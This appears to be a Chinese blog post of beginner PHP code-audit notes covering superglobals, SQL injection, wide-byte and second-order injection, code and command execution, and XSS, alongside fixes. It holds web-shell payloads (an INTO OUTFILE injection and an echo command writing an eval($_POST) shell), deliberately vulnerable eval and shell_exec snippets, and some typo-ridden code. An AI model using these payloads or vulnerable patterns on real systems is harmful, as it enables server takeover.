<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">'HTTP_HOST'</span>]  请求头信息中的Host内容，获取当前域名。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_NAME"</span>]  输出配置文件httpd.conf中的ServerName，一般情况下与HTTP_HOST值相同，但如果服务器端口不是默认的<span class="number">80</span>端口，或者协议规范不是HTTP/<span class="number">1.1</span>时，HTTP_HOST会包含这些信息，而SERVER_NAME不一定包含。（主要看配置文件的设置）。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_USER_AGENT"</span>]  获取用户相关信息，包括用户浏览器、操作系统等信息。</span><br><span class="line">$_SERVER[<span class="string">'HTTP_ACCEPT'</span>]  当前请求的ACCEPT头部信息。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_ACCEPT_LANGUAGE"</span>]  这个值是由浏览器发送，表明用户默认的语言设置，后面的q值表示用户对该语言的喜好程度。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_ACCEPT_ENCODING"</span>]  大部分的现代浏览器都支持gzip压缩，并会把这一信息报告给服务器。这时服务器就会压缩过的HTML发送给浏览器。这可以减少近<span class="number">80</span>%的文件大小，以节省下载时间和带宽。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_COOKIE"</span>]  浏览器的cookie信息。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_CONNECTION"</span>]  当前请求的连接情况。</span><br><span class="line">$_SERVER[<span class="string">"HTTP_UPGRADE_INSECURE_REQUESTS"</span>]  表示浏览器可读懂服务器发过来的请求，</span><br><span class="line">$_SERVER[<span class="string">"HTTP_CACHE_CONTROL"</span>]  表示浏览器是否会缓存这个页面信息。</span><br><span class="line">$_SERVER[<span class="string">"PATH"</span>]  当前脚本所在文件系统。</span><br><span class="line">$_SERVER[<span class="string">"SystemRoot"</span>]  当前服务器的操作系统。</span><br><span class="line">$_SERVER[<span class="string">"COMSPEC"</span>]  指向cmd.exe的路径。</span><br><span class="line">$_SERVER[<span class="string">"PATHEXT"</span>]  环境变量设置。</span><br><span class="line">$_SERVER[<span class="string">"WINDIR"</span>]  脚本指向的系统目录。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_SIGNATURE"</span>]  包含服务器版本和虚拟主机名的字符串。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_SOFTWARE"</span>]  服务器软件配置信息。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_ADDR"</span>]  当前运行脚本的服务器的ip地址。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_PORT"</span>]  服务器端口。</span><br><span class="line">$_SERVER[<span class="string">"REMOTE_ADDR"</span>]  浏览网页的用户ip。<span class="comment">//可以赋值以修改、伪造</span></span><br><span class="line">$_SERVER[<span class="string">"DOCUMENT_ROOT"</span>]  当前运行脚本所在的根目录。</span><br><span class="line">$_SERVER[<span class="string">"REQUEST_SCHEME"</span>]  服务器通信协议，是http或https。</span><br><span class="line">$_SERVER[<span class="string">"CONTEXT_PREFIX"</span>]  前缀。</span><br><span class="line">$_SERVER[<span class="string">"CONTEXT_DOCUMENT_ROOT"</span>]  当前脚本所在的文档根目录。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_ADMIN"</span>]  服务器管理员信息。</span><br><span class="line">$_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]  当前执行脚本的绝对路径。</span><br><span class="line">$_SERVER [<span class="string">"REMOTE_PORT"</span>]  用户连接到服务器时所使用的端口。</span><br><span class="line">$_SERVER[<span class="string">"GATEWAY_INTERFACE"</span>]  服务器使用的CGI规范的版本。</span><br><span class="line">$_SERVER[<span class="string">"SERVER_PROTOCOL"</span>]  请求页面时通信协议的名称和版本。</span><br><span class="line">$_SERVER[<span class="string">"REQUEST_METHOD"</span>]  请求提交数据的方式。</span><br><span class="line">$_SERVER[<span class="string">"QUERY_STRING"</span>]  服务器请求时？后面的参数。</span><br><span class="line">$_SERVER[<span class="string">"REQUEST_URI"</span>]  当前脚本路径，根目录之后的目录。</span><br><span class="line">$_SERVER[<span class="string">"SCRIPT_NAME"</span>]  当前脚本的路径。这在页面需要指向自己时非常有用。</span><br><span class="line">$_SERVER[<span class="string">"PHP_SELF"</span>]  当前正在执行脚本的文件名。</span><br><span class="line">$_SERVER[<span class="string">"REQUEST_TIME"</span>]  得到请求开始时的时间戳。</span><br><span class="line"></span><br><span class="line">var_dump($_SERVER)；</span><br></pre></td></tr></table></figure>

<p>$_FILES    文件上传</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$_FILES数组内容如下: </span><br><span class="line">$_FILES[<span class="string">'myFile'</span>][<span class="symbol">'name'</span>] 客户端文件的原名称。 </span><br><span class="line">$_FILES[<span class="string">'myFile'</span>][<span class="symbol">'type'</span>] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如"image/gif"。 </span><br><span class="line">$_FILES[<span class="string">'myFile'</span>][<span class="symbol">'size'</span>] 已上传文件的大小，单位为字节。 </span><br><span class="line">$<span class="emphasis">_FILES['myFile']['tmp_</span>name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload<span class="emphasis">_tmp_</span>dir 指定，但 用 putenv() 函数设置是不起作用的。 </span><br><span class="line">$_FILES[<span class="string">'myFile'</span>][<span class="symbol">'error'</span>] 和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>OK </span><br><span class="line">值：0; 没有错误发生，文件上传成功。 </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>INI_SIZE </span><br><span class="line">值：1; 上传的文件超过了 php.ini 中 upload<span class="emphasis">_max_</span>filesize 选项限制的值。 </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>FORM_SIZE </span><br><span class="line">值：2; 上传文件的大小超过了 HTML 表单中 MAX<span class="emphasis">_FILE_</span>SIZE 选项指定的值。 </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>PARTIAL </span><br><span class="line">值：3; 文件只有部分被上传。 </span><br><span class="line">UPLOAD<span class="emphasis">_ERR_</span>NO_FILE </span><br><span class="line">值：4; 没有文件被上传。 </span><br><span class="line">值：5; 上传文件大小为0. </span><br><span class="line"></span><br><span class="line">文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。</span><br><span class="line">var<span class="emphasis">_dump($_</span>FILES)；</span><br></pre></td></tr></table></figure>

<p>表单：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span> =<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span> =<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">'file'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>$_SESSTION 当前脚本可用SESTION变量的数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sesstion_start();</span><br><span class="line">$test = <span class="number">123</span>;</span><br><span class="line">$_SESSTION[<span class="string">'value'</span>]=$test;</span><br><span class="line"><span class="keyword">echo</span> $_SESSTION[<span class="string">'value'</span>];</span><br><span class="line">sesstion_destory();</span><br></pre></td></tr></table></figure>

<p>$_COOKIE 通过HTTP Cookies 方式传递给当前脚本的变量的数组    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cookie = $_COOKIE[<span class="number">0</span>][<span class="string">'usename'</span>] = <span class="string">"name"</span>;</span><br><span class="line">var_dump ($_COOKIE);</span><br></pre></td></tr></table></figure>

<p>COOKIE or SESSTION</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">两个都可以用来存私密的东西，同样也都有有效期的说法。</span><br><span class="line">区别在于。</span><br><span class="line">session是放在服务器上的，过期与否取决于服务期的设定，cookie是存在客户端的，过去与否可以在cookie生成的时候设置进去。</span><br><span class="line"><span class="number">1</span>、cookie数据存放在客户的浏览器上，</span><br><span class="line">session数据放在服务器上</span><br><span class="line"><span class="number">2</span>、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗</span><br><span class="line">考虑到安全应当使用session</span><br><span class="line"><span class="number">3</span>、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能</span><br><span class="line">考虑到减轻服务器性能方面，应当使用COOKIE</span><br><span class="line"><span class="number">4</span>、单个cookie在客户端的限制是<span class="number">3</span>K，就是说一个站点在客户端存放的COOKIE不能<span class="number">3</span>K。</span><br><span class="line"><span class="number">5</span>、<span class="number">300</span>个的限制我没听说</span><br><span class="line"><span class="number">6</span>、所以个人建议：</span><br><span class="line">将登陆信息等重要信息存放为SESSION</span><br><span class="line">其他信息如果需要保留，可以放在COOKIE中</span><br></pre></td></tr></table></figure>

<p>$_ENV    包含服务器端环境变量的数组、可在PHP程序的任何地方直接访问，只是被动的接受服务器端的环境变量转换为数组元素</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">环境变量（environment <span class="keyword">variables</span>）一般是指在操作系统中用来指定操作系统运行环境的一些参数，如：临时文件夹位置和系统文件夹位置等</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>mysql_query() 函数执行一条 MySQL 查询。</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563251980990.png" alt="1563251980990"></p>
<p>数字型注入    当输入的参数为整型，ID、年龄、页码，不需要单引号闭合</p>
<p>字符型注入    参数为字符串时，需要单引号闭合</p>
<p>查询数据</p>
<p>读写文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>[$_POST[<span class="string">'a'</span>]];<span class="meta">?&gt;</span>(<span class="number">16</span>进制) into outfile E:/Local/WWW/<span class="number">3.</span>php<span class="string">'--+</span></span><br></pre></td></tr></table></figure>

<p>然后菜刀，127.0.0.1/3.php    a</p>
<p>执行命令</p>
<p>盲注</p>
<p>布尔盲注</p>
<p>时间盲注</p>
<p>报错盲注</p>
<p>HTTP头注入</p>
<p>修复方案：</p>
<p>使用预编译语句</p>
<p>使用存储过程</p>
<p>检查数据类型</p>
<p>使用安全函数</p>
<h3 id="宽字节注入、二次注入（扫描不出来）"><a href="#宽字节注入、二次注入（扫描不出来）" class="headerlink" title="宽字节注入、二次注入（扫描不出来）"></a>宽字节注入、二次注入（扫描不出来）</h3><p>addslashes()给‘加上\转义</p>
<p>逃逸单引号-&gt;加一个%df</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">%df</span>'===&gt;<span class="symbol">%df</span><span class="symbol">%27</span> ==&gt;(addslashes)===&gt;<span class="symbol">%df</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%27</span>===&gt;(GBK)===&gt;運'</span><br></pre></td></tr></table></figure>

<p>修复方案，</p>
<p>使用mysql_set_charset(GBK)指定字符集</p>
<p>使用mysql_real_escape_string进行转义</p>
<p>二次注入：注入点因为经过过滤处理，无法触发SQL注入漏洞，比如addslashes函数，将单引号转义，但是存进数据库后又被还原，在这种情况下，如果发现一个新的注入同时应用了被插入的数据库数据，就可以实现闭合新发现的注入漏洞引发二次注入</p>
<p>先存进去，再查询，被转义的字符在存入数据库时转义消除，再查询，利用数据库中已经被存进去并且不存在转义的代码二次查询。</p>
<p>漏洞存在于先注册、留言板（写入脏数据）再查询、update（利用脏数据）系统</p>
<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>eval 将字符串 转化成代码，</p>
<p>思路：用户能够控制函数的输入，存在可执行代码的危险函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常见危险函数：</span><br><span class="line"><span class="keyword">eval</span>函数	assert函数	</span><br><span class="line">动态函数执行</span><br><span class="line">preg_replace函数	</span><br><span class="line">回调函数</span><br><span class="line">写入文件+包含文件</span><br></pre></td></tr></table></figure>

<p>回调函数</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563259300240.png" alt="1563259300240"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callBack</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $b = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">eval</span>($b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(funtion: <span class="string">'callBack'</span>,$b);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="string">"phpinfo()"</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>],$b);	<span class="comment">//第一个参数用于回调，传入危险函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;a = <span class="keyword">eval</span> <span class="keyword">or</span> assert</span><br></pre></td></tr></table></figure>

<p>动态函数执行</p>
<p>1.定义一个函数</p>
<p>2.将函数名（字符串）赋值给一个变量</p>
<p>3.使用变量名代替函数名 动态调用函数    //php的函数可由字符串拼接</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">'A'</span>]($_GET[<span class="string">'B'</span>])；</span><br><span class="line"></span><br><span class="line">&gt;&gt;A=assert&amp;b=phpinfo();</span><br></pre></td></tr></table></figure>

<p>preg_match_all(/$str1/,$str2,$str3)        str1为标准    str2为待匹配    str3为用于存入匹配字符的数组</p>
<p>正则表达式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">正则表达语法规则</span><br><span class="line">限定符</span><br><span class="line">边界限制符</span><br><span class="line">后向引用</span><br><span class="line">普通字符作为原子	</span><br><span class="line">特殊符号作为原子	注意转义</span><br><span class="line">通用字符类型作为原子</span><br><span class="line">自定义原子表作为原子</span><br></pre></td></tr></table></figure>

<p>通用字符</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563260759584.png" alt="1563260759584"></p>
<p>自定义原子</p>
<p>$pattern1 = ‘/[aj]sp’    //匹配asp or jsp</p>
<p>限定符</p>
<p>‘/go=gle/‘            匹配前面（’o‘）出现的原子次数0次或1次或多次    </p>
<p>‘/go+gle/‘            匹配前面（’o‘）出现的原子次数1次或多次    </p>
<p>/go?gle/                匹配前面（’o‘）出现的原子次数0次或1次    </p>
<p>边界限定符</p>
<p>‘/^abc/‘            以abc开头</p>
<p>‘/abc$/‘            以abc结尾</p>
<p>‘/^abc$/‘            只匹配abc</p>
<p>反向引用</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'/<span class="tag">\<span class="name">d</span><span class="string">&#123;4&#125;</span></span>(-)<span class="tag">\<span class="name">d</span><span class="string">&#123;2&#125;</span></span><span class="tag">\<span class="name">\</span></span>1<span class="tag">\<span class="name">d</span><span class="string">&#123;2&#125;</span></span>/';		<span class="tag">\<span class="name">d</span></span>数字，&#123;4&#125;；4个；<span class="tag">\<span class="name">\</span></span>1，代表第一个括号的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_replace（$pattern,$replacement,subject）</span><br><span class="line">pattern 	正则匹配的内容	</span><br><span class="line">replacement		用于替换的内容</span><br><span class="line">subject		要进行搜索和替换的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">第一个参数</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$str = <span class="string">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</span><br><span class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)$cmd"</span>,<span class="string">"\\1"</span>,$str1)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;</span>cmd = &lt;\/php&gt;<span class="regexp">/e			#	(.*?)-&gt;任意字符		/e</span>模式下执行replacement代码</span><br><span class="line"></span><br><span class="line">第二个参数</span><br><span class="line">preg_replace(<span class="string">"/php/e"</span>,$_GET[<span class="string">'cmd'</span>],’php‘);			<span class="comment">#执行cmd内容</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>cmd = cat /flag				<span class="comment">#大概是永远不会出现</span></span><br><span class="line"></span><br><span class="line">第三个参数</span><br><span class="line">$str = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">preg_replace(<span class="string">"/\[php\](.*?)\[\/php\]/e"</span>,\\<span class="number">1</span>,$str)</span><br><span class="line"></span><br><span class="line">思路：让cmd传过来的值与pattern相匹配，执行replacement</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;</span>[php]cat /flag[<span class="regexp">/php]</span></span><br></pre></td></tr></table></figure>

<p>修复方案：</p>
<p>尽量不要执行外部的应用程序或命令            #不用/e</p>
<p>使用自定义函数或函数库来替代外部应用程序或命令的功能</p>
<p>使用escappeshellarg函数来处理命令的函数        #用户出来的参数都是有害的</p>
<p>使用safe_mode_exec_dir来制定可执行的文件路径</p>
<p>将执行函数的参数做白名单限制，在代码或配置文件中限制某些参数    #禁止使用某些函数（源代码也不能使用）</p>
<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>输入验证不足导致。其目标是通过易受攻击的应用程序在主机操作系统上执行任意命令</p>
<p>挖掘思路，</p>
<p>用户能够控制函数输入</p>
<p>存在可执行代码的危险函数</p>
<p>代码执行：执行的效果完全受限于语言本身</p>
<p>命令执行：不受限于语言与法本身，不受命令限制</p>
<p>命令执行的类型</p>
<p>代码层过滤不严</p>
<p>系统的漏洞造成命令注入</p>
<p>调用的第三方组件存在代码执行漏洞</p>
<p>常见的危险函数</p>
<p>string system(string $command[,int return_var])        </p>
<p>cmd = echo 111&gt;1.txt  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="keyword">echo</span> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>[$_POST[<span class="string">'a'</span>]];<span class="meta">?&gt;</span>	&gt; <span class="number">1.</span>php	   [菜刀]</span><br></pre></td></tr></table></figure>

<p>passthru</p>
<p>//这两个函数有回显</p>
<p>学习windows 系统命令</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="keyword">exec</span>（<span class="keyword">string</span> $command[,array $output[,<span class="keyword">int</span> $return_var]]）</span><br></pre></td></tr></table></figure>

<p>输出填充output数组</p>
<p>状态写入return_var变量</p>
<p>这个函数无回显，echo 也只回显一行</p>
<p>string shell_exec(string $cmd)</p>
<p>无回显，echo回显所有</p>
<p>cmd = dir &gt; 4.txt      将内容写入文件</p>
<p>反引号（`） 等于shell_exec()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];		&lt;&lt; cmd=ipconfig</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec($cmd);</span><br></pre></td></tr></table></figure>

<p>过滤函数</p>
<p>escapeshellcmd ( string <code>$command</code> ) : string        过滤整条命令</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反斜线（<span class="symbol">\）</span>会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$<span class="symbol">\,</span> <span class="symbol">\x</span>0A 和 <span class="symbol">\x</span>FF。 ' 和 " 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <span class="variable">% 和 ! 字符都会被空格代替</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cmd = escapeshellcmd($_GET[<span class="string">'cmd'</span>]);		&lt;&lt; cmd=<span class="keyword">echo</span> <span class="number">5555</span> &gt; <span class="number">5.</span>txt   &gt;&gt;  <span class="number">5555</span>   <span class="number">5.</span>txt</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec($cmd);</span><br></pre></td></tr></table></figure>

<p>Escapeshellarg()    过滤参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于单个单引号, escapeshellarg 函数转义后,还会在左右各加一个单引号,但 escapeshellcmd 函数是直接加一个转义符，对于成对的单引号, escapeshellcmd 函数默认不转义,但 escapeshellarg 函数转义:</span><br></pre></td></tr></table></figure>

<p>修复方案：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">尽量少用执行命令的函数，或者直接禁用，参数值尽量使用引号包括</span><br><span class="line"></span><br><span class="line">在使用动态函数之前，确保使用的函数式指定的函数之一	（白名单）</span><br><span class="line"></span><br><span class="line">在进入执行命令的函数，方法前，对参数进行过滤，对敏感字符进行转义</span><br><span class="line"></span><br><span class="line">对于可控点是程序参数的情况下，使用escapeshellcmd函数过滤；对于可控点是程序参数值得情况下，使用escapeshellarg函数进行过滤</span><br><span class="line"></span><br><span class="line">参数的值尽量使用引号包裹，并且在拼接前用addslashes进行转义</span><br></pre></td></tr></table></figure>

<h3 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h3><p>跨站脚本攻击，攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份惊醒某种动作或者对访问者进行病毒侵害的一种攻击方式</p>
<p>蠕虫、盗取cookie、跳转钓鱼网页、查看网页浏览信息</p>
<p>挖掘思路：没有过滤参数，传入到输出函数中</p>
<p>漏洞思路：搜索内容、发表文章、留言、评论回复、资料设置</p>
<p>漏洞类型：反射型；存储型；DOM型</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563282310170.png" alt="1563282310170"></p>
<p>常见场景：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//直接输出到浏览器页面	</span></span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $content;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//直接输出到HTML标签</span></span><br><span class="line">&lt;input type = <span class="string">'text'</span> value=<span class="string">"&lt;?php echo $content?&gt;"</span>&gt;</span><br><span class="line">    <span class="comment">//直接输出到&lt;script&gt;标签</span></span><br><span class="line"> 	$content = $_GET[<span class="string">'content'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> xss = <span class="string">'&lt;?phpe cho $content ?&gt;'</span>;</span><br><span class="line">	document.write(xss);</span><br><span 